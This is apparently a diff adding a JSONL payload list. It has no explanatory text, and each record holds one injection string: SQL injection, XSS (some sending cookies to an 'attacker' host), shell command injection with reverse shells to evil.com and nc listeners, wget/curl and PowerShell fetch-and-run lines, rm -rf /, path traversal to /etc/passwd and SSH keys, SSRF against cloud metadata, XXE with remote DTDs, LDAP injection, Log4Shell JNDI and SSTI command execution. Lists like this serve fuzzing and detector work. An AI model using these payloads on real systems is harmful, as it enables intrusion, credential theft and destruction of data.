+{"ts": "2025-11-29T14:59:08.100620", "text": "1 OR 0x414141=0x414141--", "meta": {}}
+{"ts": "2025-11-29T14:59:08.119212", "text": "0' OR 'a'='a", "meta": {}}
+{"ts": "2025-11-29T14:59:08.137984", "text": "username=' OR ''='", "meta": {}}
+{"ts": "2025-11-29T14:59:08.158472", "text": "\" OR sleep(5) --", "meta": {}}
+{"ts": "2025-11-29T14:59:08.177668", "text": "\" OR pg_sleep(5) --", "meta": {}}
+{"ts": "2025-11-29T14:59:08.198139", "text": "1'/**/OR/**/'1'='1", "meta": {}}
+{"ts": "2025-11-29T14:59:08.221995", "text": "0x27204f5220313d31 --", "meta": {}}
+{"ts": "2025-11-29T14:59:08.243423", "text": "'|| (SELECT table_name FROM information_schema.tables LIMIT 1) --", "meta": {}}
+{"ts": "2025-11-29T14:59:08.266724", "text": "\";exec(cmd)\"", "meta": {}}
+{"ts": "2025-11-29T14:59:08.288291", "text": "1;SELECT load_file('/etc/passwd');--", "meta": {}}
+{"ts": "2025-11-29T14:59:08.311961", "text": "' OR COALESCE((SELECT COUNT(*) FROM users),0)=0 --", "meta": {}}
+{"ts": "2025-11-29T14:59:08.330691", "text": "'||SLEEP(5)||'", "meta": {}}
+{"ts": "2025-11-29T14:59:08.351939", "text": "'\" AND (SELECT 1 FROM (SELECT(SLEEP(0)))a) --", "meta": {}}
+{"ts": "2025-11-29T14:59:08.371313", "text": "<script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.393463", "text": "<img src=x onerror=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.414690", "text": "<svg onload=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.441232", "text": "<iframe src=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.463125", "text": "\"><script>alert(document.cookie)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.483640", "text": "'><script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.505121", "text": "\"><img src=x onerror=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.526038", "text": "<body onload=alert('XSS')>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.543311", "text": "javascript:alert(1)", "meta": {}}
+{"ts": "2025-11-29T14:59:08.566175", "text": "<svg><script>alert(1)</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.586284", "text": "\"><svg onload=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.618048", "text": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", "meta": {}}
+{"ts": "2025-11-29T14:59:08.641606", "text": "<link rel=stylesheet href=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.664464", "text": "<details open ontoggle=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.684858", "text": "<object data=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.705222", "text": "<embed src=javascript:alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.727578", "text": "<math href='javascript:alert(1)'></math>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.751424", "text": "<a href=\"javascript:alert(1)\">click</a>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.780142", "text": "\"><iframe srcdoc='<script>alert(1)</script>'></iframe>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.801972", "text": "<video><source onerror=\"alert(1)\"></video>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.824687", "text": "<img src=\"x\" onerror=\"prompt(1)\">", "meta": {}}
+{"ts": "2025-11-29T14:59:08.845454", "text": "<img src=x onerror=confirm(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.870350", "text": "<scr<script>ipt>alert(1)</scr<script>ipt>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.890044", "text": "'>\"<script>alert(1)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.921940", "text": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.948612", "text": "<script>eval(atob('YWxlcnQoMSk='))</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:08.974616", "text": "%3Cscript%3Ealert(1)%3C/script%3E", "meta": {}}
+{"ts": "2025-11-29T14:59:08.996932", "text": "&#60;script&#62;alert(1)&#60;/script&#62;", "meta": {}}
+{"ts": "2025-11-29T14:59:09.022524", "text": "<img src=\"x\" onerror=\"this.onerror=null;alert(1)\">", "meta": {}}
+{"ts": "2025-11-29T14:59:09.043391", "text": "\"><input autofocus onfocus=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.070528", "text": "<form action=javascript:alert(1)><button>click</button></form>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.097456", "text": "\"><svg onload=alert(String.fromCharCode(88,83,83))>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.121606", "text": "<iframe onload=\"window.top.postMessage('xss','*')\">", "meta": {}}
+{"ts": "2025-11-29T14:59:09.142882", "text": "<script>location='javascript:alert(1)'</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.164905", "text": "<body onfocus=alert(1) tabindex=1>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.185598", "text": "\"><video onerror=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.209195", "text": "<isindex type=search pattern=... onsearch=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.232725", "text": "<input value=\"'><script>alert(1)</script>\">", "meta": {}}
+{"ts": "2025-11-29T14:59:09.254879", "text": "\"><svg><script>prompt(1)</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.277163", "text": "<p onmouseover=alert(1)>hover</p>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.302232", "text": "<a href=\"#\" onclick=\"alert(1);return false\">click</a>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.325290", "text": "<svg><g onload=alert(1)></g></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.348700", "text": "\"><link rel=\"import\" href=\"javascript:alert(1)\">", "meta": {}}
+{"ts": "2025-11-29T14:59:09.388800", "text": "<object type=\"image/svg+xml\" data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=\"></object>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.413805", "text": "<script>document.write('<img src=x onerror=alert(1)>')</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.438529", "text": "<script>setTimeout(()=>alert(1),0)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.471967", "text": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=\"></iframe>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.498823", "text": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "meta": {}}
+{"ts": "2025-11-29T14:59:09.517896", "text": "\"><svg/onload=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.541690", "text": "<svg><foreignObject onload=alert(1)></foreignObject></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.563888", "text": "<svg><image onerror=alert(1) /></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.586969", "text": "'><svg><script>alert(\"x\")</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.614596", "text": "<a href=\"javascript:/*--><script>alert(1)</script>\">x</a>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.641955", "text": "<form><button formaction=\"javascript:alert(1)\">go</button></form>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.668252", "text": "<iframe srcdoc=\"<img src=x onerror=alert(1)>\"></iframe>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.691094", "text": "\"><img src=1 onerror=alert(document.domain)>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.715231", "text": "<svg><g onmousedown=alert(1)></g></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.740854", "text": "\"><input onkeyup=\"if(event.keyCode==13)alert(1)\">", "meta": {}}
+{"ts": "2025-11-29T14:59:09.761322", "text": "<base href=\"javascript:alert(1)//\">", "meta": {}}
+{"ts": "2025-11-29T14:59:09.782758", "text": "\"><object data=\"javascript:alert(1)\"></object>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.804780", "text": "\"><script>console.log('xss')</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.828098", "text": "\"><body onhashchange=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.850179", "text": "<img src=x onerror=eval(\"alert(1)\")>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.870948", "text": "<script>throw 1;/*alert(1)*/</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.892389", "text": "\"%3Cscript%3Ealert(1)%3C/script%3E", "meta": {}}
+{"ts": "2025-11-29T14:59:09.920482", "text": "<svg><script>console.log(atob('YWxlcnQoMSk='))</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.941845", "text": "<template onupdate=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.965333", "text": "<img src=1 onerror=this.src='javascript:alert(1)'>", "meta": {}}
+{"ts": "2025-11-29T14:59:09.987832", "text": "<iframe src='javascript:alert(1)'></iframe>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.022717", "text": "<meta http-equiv=\"refresh\" content=\"0;url=/\\x22+alert(1)\">", "meta": {}}
+{"ts": "2025-11-29T14:59:10.052639", "text": "\"><div style=\"background:url(javascript:alert(1))\"></div>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.073174", "text": "\"><object id=oo onerror=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.098094", "text": "\"><svg onload=window.top.postMessage('xss','*')>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.127285", "text": "'><svg><script>new Image().src='//attacker/p?c='+document.cookie</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.152441", "text": "<script>fetch('https://attacker/?c='+document.cookie)</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.180630", "text": "<svg><desc><![CDATA[<script>alert(1)</script>]]></desc></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.203156", "text": "\"><math href=\"javascript:alert(1)\"></math>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.226200", "text": "\"><input form=foo oninvalid=alert(1)>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.248343", "text": "<picture><source onerror=alert(1)></picture>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.271123", "text": "\"><button formaction=\"javascript:alert(1)\">x</button>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.293392", "text": "<svg><animate onbegin=alert(1) /></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.315892", "text": "<svg><set onbegin=alert(1) /></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.335923", "text": "\"><script>document.domain</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.360681", "text": "<svg><text onfocus=alert(1) tabindex=1>t</text></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.382991", "text": "<img srcset=\"x onerror=alert(1) 1x\">", "meta": {}}
+{"ts": "2025-11-29T14:59:10.403845", "text": "<img src=x onerror=alert(location.href)>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.431726", "text": "<svg><use xlink:href=\"javascript:alert(1)\"></use></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.456231", "text": "\"><object data=\"data:text/html,<script>alert(1)</script>\"></object>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.481990", "text": "<iframe srcdoc=\"<svg onload=alert(1)></svg>\"></iframe>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.503517", "text": "<script>new Function('alert(1)')()</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.529963", "text": "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.571269", "text": "\"><img src=\"data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+\" />", "meta": {}}
+{"ts": "2025-11-29T14:59:10.607608", "text": "<svg onload=\"var x=document.createElement('img');x.src='//att/p?c='+document.cookie;document.body.appendChild(x)\">", "meta": {}}
+{"ts": "2025-11-29T14:59:10.634103", "text": "<input value=\"%3Cscript%3Ealert(1)%3C/script%3E\">", "meta": {}}
+{"ts": "2025-11-29T14:59:10.657037", "text": "<svg><script async>alert(1)</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.682759", "text": "<iframe srcdoc=\"<input onfocus=alert(1) autofocus>\"></iframe>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.714713", "text": "<svg><image xlink:href=\"data:image/svg+xml;utf8,<script>alert(1)</script>\"></image></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.736351", "text": "<body onpointerdown=alert(1) tabindex=0>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.760878", "text": "<svg><text onmousemove=alert(1)>x</text></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.787580", "text": "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.814639", "text": "<svg><script>setInterval(()=>alert(1),1000)</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.839942", "text": "<script>location='data:text/html,<script>alert(1)</script>'</script>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.863893", "text": "\"><div onclick=\"eval('alert(1)')\">x</div>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.887948", "text": "<template contenteditable oninput=alert(1)>x</template>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.918755", "text": "<svg><image onerror=\"this.ownerDocument.defaultView.alert(1)\"></image></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.940585", "text": "<svg><script>parent.alert(1)</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.963037", "text": "<svg><script>top.alert(1)</script></svg>", "meta": {}}
+{"ts": "2025-11-29T14:59:10.980058", "text": "; ls -la", "meta": {}}
+{"ts": "2025-11-29T14:59:10.996794", "text": "; cat /etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:11.014353", "text": "| cat /etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:11.031119", "text": "&& whoami", "meta": {}}
+{"ts": "2025-11-29T14:59:11.047117", "text": "|| id", "meta": {}}
+{"ts": "2025-11-29T14:59:11.061758", "text": "`id`", "meta": {}}
+{"ts": "2025-11-29T14:59:11.078765", "text": "$(whoami)", "meta": {}}
+{"ts": "2025-11-29T14:59:11.098858", "text": "; curl http://attacker/p", "meta": {}}
+{"ts": "2025-11-29T14:59:11.120315", "text": "; wget http://evil/a.sh; sh a;", "meta": {}}
+{"ts": "2025-11-29T14:59:11.143568", "text": "; nc attacker 4444 -e /bin/sh", "meta": {}}
+{"ts": "2025-11-29T14:59:11.167495", "text": "; bash -i >& /dev/tcp/evil.com/4444 0>&1", "meta": {}}
+{"ts": "2025-11-29T14:59:11.187339", "text": "; ping -c 4 8.8.8.8", "meta": {}}
+{"ts": "2025-11-29T14:59:11.205905", "text": "; rm -rf / #", "meta": {}}
+{"ts": "2025-11-29T14:59:11.223260", "text": "; shutdown -h now", "meta": {}}
+{"ts": "2025-11-29T14:59:11.244487", "text": "; powershell -Command \"Start-Process calc.exe\"", "meta": {}}
+{"ts": "2025-11-29T14:59:11.264348", "text": "; perl -e 'exec \"/bin/sh\";'", "meta": {}}
+{"ts": "2025-11-29T14:59:11.284035", "text": "'; exec('/bin/bash'); --", "meta": {}}
+{"ts": "2025-11-29T14:59:11.308785", "text": "| bash -i >& /dev/tcp/1.2.3.4/1234 0>&1", "meta": {}}
+{"ts": "2025-11-29T14:59:11.328402", "text": "$(${IFS}PATH=/bin;ls)", "meta": {}}
+{"ts": "2025-11-29T14:59:11.349845", "text": "; nc -e /bin/sh 10.0.0.1 4444", "meta": {}}
+{"ts": "2025-11-29T14:59:11.378598", "text": "; mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc attacker 4444 > /tmp/f", "meta": {}}
+{"ts": "2025-11-29T14:59:11.398029", "text": "$(curl attacker/payload.sh)", "meta": {}}
+{"ts": "2025-11-29T14:59:11.420442", "text": "; python -c 'import os; os.system(\"id\")'", "meta": {}}
+{"ts": "2025-11-29T14:59:11.445066", "text": ";perl -MIO -e '$p=qq{/bin/sh -i};'", "meta": {}}
+{"ts": "2025-11-29T14:59:11.478398", "text": "; powershell -NoProfile -WindowStyle Hidden -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil')\"", "meta": {}}
+{"ts": "2025-11-29T14:59:11.498725", "text": "; at now + 1 minute 'rm -rf /tmp/*'", "meta": {}}
+{"ts": "2025-11-29T14:59:11.519493", "text": "| /bin/bash -c 'cat /etc/passwd'", "meta": {}}
+{"ts": "2025-11-29T14:59:11.540760", "text": "; awk 'BEGIN{system(\"whoami\")}'", "meta": {}}
+{"ts": "2025-11-29T14:59:11.561676", "text": "; php -r 'system(\"id\");'", "meta": {}}
+{"ts": "2025-11-29T14:59:11.594485", "text": "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLnBvcnQ= | base64 -d | sh)", "meta": {}}
+{"ts": "2025-11-29T14:59:11.612010", "text": "; telnet attacker 4444", "meta": {}}
+{"ts": "2025-11-29T14:59:11.632443", "text": "; ftp attacker <<EOF", "meta": {}}
+{"ts": "2025-11-29T14:59:11.652067", "text": "; echo hacked >> /tmp/hacked", "meta": {}}
+{"ts": "2025-11-29T14:59:11.673521", "text": "../../../../etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:11.695995", "text": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "meta": {}}
+{"ts": "2025-11-29T14:59:11.721714", "text": "/var/www/html/../../../../etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:11.746180", "text": "..%2f..%2f..%2fetc%2fpasswd", "meta": {}}
+{"ts": "2025-11-29T14:59:11.769596", "text": "..%5c..%5c..%5cwindows\\system.ini", "meta": {}}
+{"ts": "2025-11-29T14:59:11.793771", "text": "....//....//....//etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:11.817324", "text": "..%c0%af..%c0%afetc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:11.842007", "text": "/../../../../../../boot.ini", "meta": {}}
+{"ts": "2025-11-29T14:59:11.871297", "text": "/../../../../../../root/.ssh/id_rsa", "meta": {}}
+{"ts": "2025-11-29T14:59:11.892971", "text": "../../../../etc/shadow", "meta": {}}
+{"ts": "2025-11-29T14:59:11.913866", "text": "..\\..\\..\\config\\database.yml", "meta": {}}
+{"ts": "2025-11-29T14:59:11.938694", "text": "/proc/self/environ", "meta": {}}
+{"ts": "2025-11-29T14:59:11.956271", "text": "/etc/hosts%00", "meta": {}}
+{"ts": "2025-11-29T14:59:11.973747", "text": "/etc/passwd%00", "meta": {}}
+{"ts": "2025-11-29T14:59:11.995094", "text": "..%00/..%00/..%00/etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.017173", "text": "..//////..//////etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.041608", "text": "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.063244", "text": ".././.././../etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.087229", "text": "..\\..\\..\\..\\..\\..\\windows\\win.ini", "meta": {}}
+{"ts": "2025-11-29T14:59:12.112344", "text": "/../../../../../../windows/system32/config/sam", "meta": {}}
+{"ts": "2025-11-29T14:59:12.134384", "text": "file:///etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.158245", "text": "../../../../../etc/ssh/ssh_config", "meta": {}}
+{"ts": "2025-11-29T14:59:12.181690", "text": "..%2f..%2f..%2f..%2fetc%2fpasswd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.208045", "text": "..%5C..%5C..%5C..%5Cwindows\\system32\\drivers\\etc\\hosts", "meta": {}}
+{"ts": "2025-11-29T14:59:12.230124", "text": "..%2f%2e%2e%2fetc%2fpasswd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.247667", "text": "/etc/passwd\u0000", "meta": {}}
+{"ts": "2025-11-29T14:59:12.276456", "text": "..%2e%2e%2f..%2e%2e%2fetc%2fpasswd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.307722", "text": "/var/log/../run/../etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.367438", "text": "../../../../boot.ini", "meta": {}}
+{"ts": "2025-11-29T14:59:12.478180", "text": "../../../../../../proc/self/cmdline", "meta": {}}
+{"ts": "2025-11-29T14:59:12.518284", "text": "http://127.0.0.1/admin", "meta": {}}
+{"ts": "2025-11-29T14:59:12.593092", "text": "http://localhost:8080", "meta": {}}
+{"ts": "2025-11-29T14:59:12.634774", "text": "http://0.0.0.0:80", "meta": {}}
+{"ts": "2025-11-29T14:59:12.665634", "text": "http://[::1]/", "meta": {}}
+{"ts": "2025-11-29T14:59:12.693539", "text": "http://10.0.0.1/internal", "meta": {}}
+{"ts": "2025-11-29T14:59:12.724508", "text": "http://192.168.1.1/admin", "meta": {}}
+{"ts": "2025-11-29T14:59:12.760896", "text": "http://169.254.169.254/latest/meta-data/", "meta": {}}
+{"ts": "2025-11-29T14:59:12.801577", "text": "http://127.0.0.1:2375/v1.24/containers/json", "meta": {}}
+{"ts": "2025-11-29T14:59:12.834852", "text": "file:///etc/passwd", "meta": {}}
+{"ts": "2025-11-29T14:59:12.874168", "text": "dict://127.0.0.1:25/", "meta": {}}
+{"ts": "2025-11-29T14:59:12.913757", "text": "gopher://127.0.0.1:11211/_stats", "meta": {}}
+{"ts": "2025-11-29T14:59:12.948154", "text": "http://127.1/", "meta": {}}
+{"ts": "2025-11-29T14:59:12.983821", "text": "http://2130706433/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.041933", "text": "http://0x7f000001/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.093009", "text": "http://169.254.169.254/computeMetadata/v1/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.122586", "text": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.146515", "text": "http://169.254.169.254/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.171680", "text": "https://169.254.169.254/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.204115", "text": "http://169.254.169.254/computeMetadata/v1/project/project-id", "meta": {}}
+{"ts": "2025-11-29T14:59:13.241661", "text": "http://unix:/var/run/docker.sock:/containers/json", "meta": {}}
+{"ts": "2025-11-29T14:59:13.277438", "text": "http://[::ffff:127.0.0.1]/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.306102", "text": "http://localhost%00.attacker.com/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.333299", "text": "file://C:\\Windows\\System32\\drivers\\etc\\hosts", "meta": {}}
+{"ts": "2025-11-29T14:59:13.361764", "text": "http://10.255.255.1/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.386898", "text": "http://example.com@169.254.169.254/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.411135", "text": "http://%5b::1%5d/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.441694", "text": "http://[127.0.0.1]:80/", "meta": {}}
+{"ts": "2025-11-29T14:59:13.472562", "text": "http://169.254.169.254/latest/meta-data/../", "meta": {}}
+{"ts": "2025-11-29T14:59:13.500602", "text": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "meta": {}}
+{"ts": "2025-11-29T14:59:13.535976", "text": "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>", "meta": {}}
+{"ts": "2025-11-29T14:59:13.573353", "text": "<?xml version='1.0'?><!DOCTYPE r [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><r>&xxe;</r>", "meta": {}}
+{"ts": "2025-11-29T14:59:13.608346", "text": "<!DOCTYPE foo [ <!ENTITY % x SYSTEM \"http://evil.com/evil.dtd\"> %x; ]>", "meta": {}}
+{"ts": "2025-11-29T14:59:13.641425", "text": "<!ENTITY % xx SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">", "meta": {}}
+{"ts": "2025-11-29T14:59:13.676781", "text": "<!DOCTYPE foo [ <!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"> %dtd; ]>", "meta": {}}
+{"ts": "2025-11-29T14:59:13.702479", "text": "<!ENTITY % remote SYSTEM \"http://attacker.com/payload.dtd\"> %remote;", "meta": {}}
+{"ts": "2025-11-29T14:59:13.728846", "text": "<!DOCTYPE root [ <!ENTITY % ext SYSTEM \"file:///etc/passwd\"> %ext; ]>", "meta": {}}
+{"ts": "2025-11-29T14:59:13.762930", "text": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % all '<!ENTITY xxe SYSTEM \"file:///etc/passwd\">'>%all;]>&xxe;", "meta": {}}
+{"ts": "2025-11-29T14:59:13.791628", "text": "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]>", "meta": {}}
+{"ts": "2025-11-29T14:59:13.827355", "text": "<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % res \"<!ENTITY &#x25; ex SYSTEM 'http://attacker/?%file;'>\">%res;", "meta": {}}
+{"ts": "2025-11-29T14:59:13.866060", "text": "<?xml version=\"1.0\"?><!DOCTYPE a [<!ELEMENT a ANY ><!ENTITY % b SYSTEM \"http://attacker/dtd\"> %b;]><a>&lol;</a>", "meta": {}}
+{"ts": "2025-11-29T14:59:13.984434", "text": "<!ENTITY % dtd SYSTEM \"http://attacker/payload.dtd\"> %dtd;", "meta": {}}
+{"ts": "2025-11-29T14:59:14.047807", "text": "<!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://attacker/evil\"> %remote;]>", "meta": {}}
+{"ts": "2025-11-29T14:59:14.106308", "text": "<!DOCTYPE foo [ <!ENTITY % local SYSTEM \"file:///etc/passwd\"> %local; ]>", "meta": {}}
+{"ts": "2025-11-29T14:59:14.160720", "text": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % d SYSTEM \"file:///etc/passwd\"> %d;]><foo>&xxe;</foo>", "meta": {}}
+{"ts": "2025-11-29T14:59:14.205214", "text": "<!DOCTYPE doc [ <!ENTITY % xxe SYSTEM \"http://attacker/evil.dtd\"> %xxe; ]>", "meta": {}}
+{"ts": "2025-11-29T14:59:14.235115", "text": "*)(|(objectclass=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.268592", "text": "*))(|(uid=*", "meta": {}}
+{"ts": "2025-11-29T14:59:14.303840", "text": "(cn=*)", "meta": {}}
+{"ts": "2025-11-29T14:59:14.370665", "text": "*)(uid=*))(|(sn=*)", "meta": {}}
+{"ts": "2025-11-29T14:59:14.436653", "text": "admin*)(|(password=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.502868", "text": "*)(!(|(cn=*)))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.534521", "text": "(|(uid=*)(userPassword=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.559436", "text": "*)(uid=*))(|(objectClass=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.582215", "text": "(|(uid=*))(|(mail=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.606822", "text": "*))(uid=*))(|(uid=*", "meta": {}}
+{"ts": "2025-11-29T14:59:14.633100", "text": "(|(uid=*)(cn=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.673012", "text": "(uid=*))(|(uid=*)(sn=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.703495", "text": "*)(&(password=*)(userPassword=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.734521", "text": "(uid=*)(|(password=*))", "meta": {}}
+{"ts": "2025-11-29T14:59:14.762267", "text": "{{7*7}}", "meta": {}}
+{"ts": "2025-11-29T14:59:14.791059", "text": "{{config.items()}}", "meta": {}}
+{"ts": "2025-11-29T14:59:14.819594", "text": "{{request.application.__dict__}}", "meta": {}}
+{"ts": "2025-11-29T14:59:14.857494", "text": "{% print('hacked') %}", "meta": {}}
+{"ts": "2025-11-29T14:59:14.907732", "text": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True,stdout=-1).communicate() }}", "meta": {}}
+{"ts": "2025-11-29T14:59:14.940306", "text": "${{7*7}}", "meta": {}}
+{"ts": "2025-11-29T14:59:14.970388", "text": "<%= system('ls') %>", "meta": {}}
+{"ts": "2025-11-29T14:59:15.021707", "text": "#{7*7}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.065153", "text": "${jndi:ldap://attacker.com/a}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.093569", "text": "{{ ''.__class__.__mro__ }}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.124629", "text": "{{ get_flashed_messages().__class__ }}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.159226", "text": "{{ ''.__class__.__mro__[2].__subclasses__() }}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.183877", "text": "{{ config.__dict__ }}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.213062", "text": "{{ request.args }}", "meta": {}}
+{"ts": "2025-11-29T14:59:15.272104", "text": "{{ ''.__class__.__mro__[2].__subclasses__()[59]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}", "meta": {}}
